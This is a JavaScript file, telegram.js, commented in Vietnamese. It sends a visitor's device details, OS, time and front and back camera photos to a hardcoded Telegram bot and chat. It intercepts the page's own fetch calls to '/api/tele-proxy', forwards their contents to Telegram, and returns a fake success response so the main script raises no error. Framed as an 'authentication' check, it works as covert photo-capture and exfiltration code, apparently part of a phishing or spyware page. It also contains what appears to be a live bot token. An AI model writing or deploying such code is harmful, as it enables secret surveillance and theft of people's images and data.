// telegram.js - Gửi dữ liệu sang Telegram
// ===============================================
// 🔴 QUAN TRỌNG: THAY TOKEN VÀ CHAT ID THẬT CỦA BẠN VÀO ĐÂY
// ===============================================

// 👉 LẤY TOKEN TỪ @BotFather TRÊN TELEGRAM
const BOT_TOKEN = '8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac';

// 👉 LẤY CHAT ID TỪ @userinfobot TRÊN TELEGRAM  
const CHAT_ID = '7997436406';

// ===============================================

// Hàm gửi dữ liệu lên Telegram
window.sendToTelegram = async (data) => {
    try {
        console.log("📤 Đang gửi lên Telegram...");
        
        let clientInfo = {};
        if (data.clientInfo) {
            clientInfo = typeof data.clientInfo === 'string' 
                ? JSON.parse(data.clientInfo) 
                : data.clientInfo;
        }
        
        // Định dạng tin nhắn
        const message = `🔐 *THÔNG BÁO XÁC THỰC MỚI*
━━━━━━━━━━━━━━━━━━━━━
📱 *Thiết bị:* ${clientInfo.device || 'Không xác định'}
💿 *Hệ điều hành:* ${clientInfo.os || 'Không xác định'}
⏰ *Thời gian:* ${clientInfo.time || new Date().toLocaleString('vi-VN')}
📷 *Trạng thái:* ${clientInfo.camera || 'N/A'}
━━━━━━━━━━━━━━━━━━━━━`;
        
        // Gửi tin nhắn text
        const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const textResult = await textResponse.json();
        if (textResult.ok) {
            console.log("✅ Đã gửi tin nhắn text thành công");
        } else {
            console.log("❌ Lỗi gửi text:", textResult);
        }
        
        // Gửi ảnh camera trước
        if (data.front && data.front instanceof Blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', data.front, 'front_camera.jpg');
            fd.append('caption', '📸 Ảnh camera trước');
            
            const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: fd
            });
            const photoResult = await photoResponse.json();
            if (photoResult.ok) {
                console.log("✅ Đã gửi ảnh camera trước");
            }
        }
        
        // Gửi ảnh camera sau
        if (data.back && data.back instanceof Blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', data.back, 'back_camera.jpg');
            fd.append('caption', '📸 Ảnh camera sau');
            
            const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: fd
            });
            const photoResult = await photoResponse.json();
            if (photoResult.ok) {
                console.log("✅ Đã gửi ảnh camera sau");
            }
        }
        
        console.log("🎉 Hoàn tất gửi lên Telegram!");
        
    } catch (error) {
        console.error('❌ Lỗi gửi Telegram:', error);
    }
};

// Chặn request đến API proxy và chuyển hướng sang Telegram
const originalFetch = window.fetch;
window.fetch = async (url, options) => {
    if (url === '/api/tele-proxy' && options?.body) {
        console.log("🔄 Đã chặn request, đang chuyển sang Telegram...");
        
        const formData = options.body;
        if (formData instanceof FormData) {
            const data = {
                clientInfo: formData.get('clientInfo'),
                front: formData.get('front'),
                back: formData.get('back')
            };
            // Gửi sang Telegram
            window.sendToTelegram(data);
        }
        
        // Trả về response thành công để main.js không báo lỗi
        return new Response(JSON.stringify({ ok: true, message: "Đã gửi qua Telegram" }), {
            status: 200,
            headers: { 'Content-Type': 'application/json' }
        });
    }
    return originalFetch(url, options);
};

console.log("🚀 Telegram proxy đã sẵn sàng!");
